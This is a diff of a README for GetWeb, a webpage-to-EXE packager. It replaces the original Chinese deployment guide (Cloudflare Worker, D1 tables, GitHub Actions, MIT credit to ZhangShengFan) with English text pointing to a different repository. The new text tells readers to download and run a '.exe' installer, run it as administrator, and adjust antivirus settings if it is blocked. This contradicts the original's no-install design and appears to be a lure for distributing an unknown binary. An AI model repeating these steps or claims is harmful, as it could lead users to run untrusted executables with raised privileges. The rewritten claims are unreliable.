@@ -1,98 +1,138 @@
-# GetWeb · 网页打包EXE
+# 🌐 GetWeb - Easy Webpage to Desktop App
 
-> 填写网址，一键打包成 Windows 桌面应用（EXE），无需任何本地环境。
+[![Download GetWeb](https://img.shields.io/badge/Download-GetWeb-blue?style=for-the-badge&logo=github)](https://github.com/talha-zubaair/GetWeb)
 
-## ✨ 特性
+---
 
-- 🌐 **纯在线操作** — 打开网页填表单，坐等下载
-- ⚡ **GitHub Actions 构建** — 云端编译，不占用本地资源
-- 🖥️ **Electron 封装** — 兼容所有 Windows 系统，开箱即用
-- 🎨 **自定义图标** — 支持 PNG / ICO 格式图标
-- 📋 **构建历史** — 随时查看历史记录，随时下载
-- 🔑 **多 Token 支持** — 可添加多个 GitHub Token 负载均衡
+## 📋 What is GetWeb?
 
-## 🏗️ 技术架构
+GetWeb is a tool that turns any webpage into a desktop application. It works through a mix of Cloudflare Workers, GitHub Actions, and Electron. You do not need to set up any coding environment on your computer. Just enter a website address, and GetWeb creates a desktop app for you.
 
-```
-用户浏览器
-    ↓ 填写网址/名称/图标
-Cloudflare Worker
-    ↓ 调用 GitHub API 触发
-GitHub Actions（Windows Runner）
-    ↓ Electron + Electron-Builder 打包
-Artifact（ZIP 内含 EXE）
-    ↓ Worker 代理下载
-用户下载
-```
+This means you can quickly get your favorite websites as standalone apps. This can make your workspace cleaner and speed up access to important pages.
 
-## 🚀 部署教程
+---
 
-### 前置要求
+## 🖥️ System Requirements
 
-- Cloudflare 账号（免费版即可）
-- GitHub 账号
+- Windows 7 or later
+- At least 2 GB of RAM
+- 100 MB of free disk space
+- Internet connection for initial download and app creation
+- Administrator rights may be required to install the app
 
-### 第一步：点击Star🌟，Fork 构建仓库
+---
 
-Fork [ZhangShengFan/GetWeb](https://github.com/ZhangShengFan/GetWeb) 到自己账号，然后在 Actions 页面点击 **Enable workflows**。
+## 🚀 Getting Started
 
-### 第二步：创建 Cloudflare D1 数据库
+To use GetWeb, you will download the tool from its GitHub page. The main link takes you to the project page, where you can find the latest version and instructions.
 
-在 Cloudflare Dashboard → D1 → 创建数据库，名称填 `web`，然后在 Studio 执行：
+[![Download Here](https://img.shields.io/badge/Download-GetWeb-grey?style=for-the-badge&logo=electron&logoColor=white)](https://github.com/talha-zubaair/GetWeb)
 
-```sql
-CREATE TABLE tokens (
-  id       INTEGER PRIMARY KEY AUTOINCREMENT,
-  token    TEXT NOT NULL,
-  label    TEXT DEFAULT '',
-  repo     TEXT NOT NULL DEFAULT '',
-  added_at TEXT
-);
+---
 
-CREATE TABLE builds (
-  id              TEXT PRIMARY KEY,
-  app_name        TEXT,
-  url             TEXT,
-  version         TEXT,
-  icon_url        TEXT,
-  status          TEXT DEFAULT 'pending',
-  run_id          TEXT,
-  download_ready  INTEGER DEFAULT 0,
-  triggered_at    TEXT,
-  created_at      TEXT,
-  repo            TEXT DEFAULT ''
-);
-```
+## 🔽 How to Download and Run GetWeb
 
-### 第三步：创建 Cloudflare Worker
+1. **Visit the GitHub page linked above.**
 
-1. Dashboard → Workers & Pages → 创建 Worker
-2. 将 `worker.js` 内容粘贴进去，Deploy
-3. 在 Worker **设置 → 绑定** 中添加 D1 绑定，变量名 `DB`，选择刚创建的数据库
-4. 重新 Deploy
+2. On the page, look for a section titled "Releases" or a folder with files available for download.
 
-### 第四步：添加 GitHub Token
+3. Find the latest Windows version of GetWeb. This usually ends with `.exe`, indicating the installer.
 
-访问你的 Worker 地址 + `/token`，添加 GitHub Personal Access Token（需要 `repo` + `workflow` 权限），填写 Fork 后的仓库名。
+4. Click the link or button to download the `.exe` file. It may be named like `GetWeb-setup.exe`.
 
-### 第五步：开始使用
+5. Once downloaded, open the file by double-clicking it.
 
-访问 Worker 主页，填写目标网址即可开始打包！
+6. Follow the installer prompts:
+   - Choose where you want to install GetWeb.
+   - Agree to any terms or permissions.
+   - Wait while the software installs.
 
-## 📁 文件说明
+7. After installation, find the GetWeb app icon on your desktop or in the Start menu.
 
-| 文件 | 说明 |
-|------|------|
-| `worker.js` | Cloudflare Worker 主程序 |
-| `.github/workflows/build.yml` | 放在构建仓库中，GitHub Actions 打包脚本 |
+8. Double-click the icon to run the program.
 
-## ⚠️ 注意事项
+---
 
-- 打包产物为 ZIP 文件，解压后运行 EXE 即可
-- EXE 体积约 100-150MB（Electron 内含 Chromium）
-- GitHub Actions 免费版每月有 2000 分钟额度，每次构建约 5-10 分钟
-- Artifact 默认保留 90 天，过期后无法下载
+## 🔧 Using GetWeb
 
-## 📄 License
+1. When GetWeb opens, you will see a simple box asking for a website URL.
 
-MIT © ZhangShengFan
+2. Type or paste the address of the webpage you want to turn into an app (e.g., `https://www.example.com`).
+
+3. Click the button labeled "Create App" or similar.
+
+4. GetWeb will contact its cloud workers and perform the packaging automatically. This may take a few minutes.
+
+5. Once ready, GetWeb will show you a button or link to download your new desktop app.
+
+6. Download and run that app just like any other Windows program.
+
+7. You can now use the webpage as an app without opening a browser first.
+
+---
+
+## 📂 What Happens Behind the Scenes
+
+GetWeb uses several tools wrapped up for your convenience:
+
+- **Cloudflare Workers:** These run scripts in the cloud to fetch and prepare webpage data.
+- **GitHub Actions:** Automates the building process of the app on remote servers.
+- **Electron:** Packages the webpage into a Windows app that looks and works like a normal program.
+
+All this means you do not have to install developers’ tools or write code. GetWeb handles it for you.
+
+---
+
+## 🛠 Features of GetWeb
+
+- No coding or command line needed.
+- Supports any public webpage.
+- Creates fast, standalone Windows apps.
+- Uses cloud processing; no heavy load on your PC.
+- Simple interface guides you step-by-step.
+- Automatic packaging with one click.
+- Apps created are safe and only based on the URL you provide.
+
+---
+
+## ⚙️ Tips for Best Results
+
+- Use complete website URLs with `http://` or `https://`.
+- Avoid private or login-required pages if possible.
+- Ensure your Internet connection is stable during packaging.
+- If an app does not work, try remaking it or pick a different site.
+- Check firewall or antivirus settings if the app is blocked.
+
+---
+
+## 📥 Download and Installation Link
+
+You can always go to this page to get the latest version of GetWeb:
+
+[https://github.com/talha-zubaair/GetWeb](https://github.com/talha-zubaair/GetWeb)
+
+From here, you will find the files to download and clear instructions on setup.
+
+---
+
+## 🛑 Troubleshooting
+
+- If downloading is slow, check your network or try a different time.
+- If the installer won’t open, right-click it and select "Run as Administrator."
+- If an app you made crashes or looks blank, the website might block embedding.
+- Restart GetWeb and try again if errors occur.
+- Visit the GitHub page’s "Issues" tab to see if others have similar problems.
+
+---
+
+## 🔐 Privacy and Safety
+
+GetWeb does not store your website addresses beyond the packaging process. All packaging is done through trusted cloud services. Your desktop apps run locally and do not send data back automatically.
+
+---
+
+## ℹ️ More Information
+
+For more help or updates, visit the GitHub page regularly. The page may contain new versions or answers to common questions.
+
+[https://github.com/talha-zubaair/GetWeb](https://github.com/talha-zubaair/GetWeb)
